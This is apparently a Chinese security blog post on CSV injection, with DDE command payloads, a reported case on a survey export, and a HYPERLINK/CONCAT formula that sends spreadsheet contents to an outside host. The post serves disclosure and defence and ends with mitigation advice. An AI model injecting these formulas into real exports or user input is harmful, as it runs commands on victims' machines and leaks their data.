---
layout: post
title: CSV Injection Vulnerability
---
#### 0x01 概述

现在很多应用提供了导出电子表格的功能（不限于 Web 应用），早在 2014 年 8月 29 日国外 James Kettle 便发表了《Comma Separated Vulnerabilities》文章来讲述导出表格的功能可能会导致注入命令的风险，因为导出的表格数据有很多是来自于用户控制的，如：投票应用、邮箱导出。攻击方式类似于 XSS ：所有的输入都是不可信的。

#### 0x02 公式注入 & DDE

我们知道在 Excel 中是可以运行计算公式的： ``` =1+5 ```，它会将以 = 开头的单元格内容解释成公式并运行，单纯的运行计算公式可能没什么用，但这里可以用到 DDE 。[Dynamic Data Exchange](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx)（DDE）是一款来自微软的古老技术，它是 Windows 下的一种跨进程通信的协议，支持 Microsoft Excel， LibreOffice 和 Apache OpenOffice。

执行 cmd 弹出计算器：

    =cmd|' /C calc'!A0

![https://ooo.0o0.ooo/2016/05/17/573ada31da5ae.png](https://ooo.0o0.ooo/2016/05/17/573ada31da5ae.png)

当然也可以使用 -cmd ，+cmd 来执行 DDE ，这个问题在2014年进行了修复（CVE-2014-3524），所以我们现在注入命令执行时软件会有如下的提示：

![https://ooo.0o0.ooo/2016/05/17/573adb7994037.png](https://ooo.0o0.ooo/2016/05/17/573adb7994037.png)

![https://ooo.0o0.ooo/2016/05/17/573adb6c6d9dd.jpg](https://ooo.0o0.ooo/2016/05/17/573adb6c6d9dd.jpg)

这也就是现在这个漏洞类型的特殊性，虽然软件有着这样的安全风险提醒但仍有大量的厂商承认并修复潜在的漏洞威胁：

- [https://hackerone.com/reports/90274](https://hackerone.com/reports/90274)
- [https://hackerone.com/reports/111192](https://hackerone.com/reports/111192)
- ...

其中很大的一方面是由于信任域的原因导致用户仍可能受到攻击，用户在 security.com 域下导出自己的Guestbook.csv ，但由于恶意用户偷偷的在留言板中插入了恶意代码：

    =HYPERLINK("http://rm-rf.gg?test="&A2&A3,"Error: Please click me!")

这样就导致当用户在导出报表后倘若点击了某个单元格则会导致 A2,A3 的单元格内容泄露：

![https://ooo.0o0.ooo/2016/05/17/573adcfad9d32.jpg](https://ooo.0o0.ooo/2016/05/17/573adcfad9d32.jpg)

所以说这个漏洞是要看背景的，由于它的特殊性（当然也可以配合社工），也就会出现厂商在审核此类漏洞时明明是一个 CSV Injection 漏洞但不会确认修复的情况。

#### 0x03 实例

之前报告给腾讯的《CSV Injection on wj.qq.com》漏洞（已经修复）：

![https://ooo.0o0.ooo/2016/05/17/573ade4459a27.png](https://ooo.0o0.ooo/2016/05/17/573ade4459a27.png)

用户发起投票后，攻击者可以注入CSV 公式/DDE代码，之后管理员进入投票结果页面导出 EXCEL ：

    ➜  /tmp cat 465864_seg_1.csv
    "编号","开始答题时间","结束答题时间","自定义字段","1.您使用过xx网吗？","2.您的性别","3.您的年龄？","4.您的婚姻状况","5.您的最高学历","6.您的月收入（或每月生活费）","7.您是否觉得xx网很容易找到","8.您对网站logo的满意程度（logo即网站的品牌标识）","9.对导航栏目的满意程度","10.对网站页面设置及布局的满意程度","11.对网站内容编排的满意程度","12.对网站色彩风格的满意程度","13.对网站字体的满意程度","14.与同类网站相比，您对xx上的价格满意吗","15.您对xx目前整体的产品质量水平感觉如何","16.您觉得xx上的商品信息的可信度怎么样","17.您觉得xx的售后服务怎么样","18.您觉得xx更新信息的及时性怎么样","19.您的咨询或抱怨通常会得到及时的回复吗","20.您觉得xx的交易和评价几率真实可靠吗","21.您觉得xx网能很好的保证交易时的安全性吗","22.123123123",
    "1","2016-04-27 19:26:45","2016-04-27 19:27:27","","A.使用过","A.男","C.26-30岁","B.未婚","D.本科","I.不方便透露","B.否","3","3","3","3","3","3","3","3","3","3","3","A.是","A.是","A.是","",
    "2","2016-04-27 19:27:30","2016-04-27 19:28:09","","A.使用过","A.男","D.31-40岁","B.未婚","B.高中/中专","D.3001-5000元","A.是","3","3","4","4","4","4","4","4","4","4","4","A.是","B.否","A.是","=cmd|'/k ipconfig'!A0",
    
可以看到在用户留言的字段，成功的注入：```=cmd|'/k ipconfig'!A0``` ，当然也可以通过不触发安全警告的前提下窃取管理员导出的 CSV 数据，也就是前面提到的 ```=HYPERLINK``` 。

#### 0x04 关于全文信息泄露

之前使用 &A1&A2&A3&A4 窃取表单数据的方式看起来有点笨重，我找到了一种新的方法来更方便的窃取全文信息：[https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&rs=en-US&ad=US](https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&rs=en-US&ad=US)

> APPLIES TO: Excel 2016, Excel Online, Excel for Android tablets, Excel Mobile, Excel for Android phones, Less.

2016 之前的 excel 和其他的版本的连接字符串的函数 concatenate 不支持 cell range 的语法，也不能自定义函数，这样的话就没有办法简写，只能生成比较长的url，但 2016 之后的 excel 我们可以使用 concat 函数，支持传入一个 range，比如 concat(A1:A10) ，这样便能直接读取整个表格中的数据。

#### 0x05 修复方案

过滤公式所用到的特殊字符（不应盲目过滤），因为个别情况下可能会影响产品的正常功能使用：

- 手机号码 +86 xxxxx 
- 邮箱地址 @test.com
- 字符串 test-injection
- ...

#### 0x06 参考

1. [http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/](http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/)
2. [http://www.freebuf.com/vuls/102790.html](http://www.freebuf.com/vuls/102790.html)
3. [https://hackerone.com/reports/90274](https://hackerone.com/reports/90274)
4. [https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&rs=en-US&ad=US](https://support.office.com/en-us/article/CONCAT-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-US&rs=en-US&ad=US)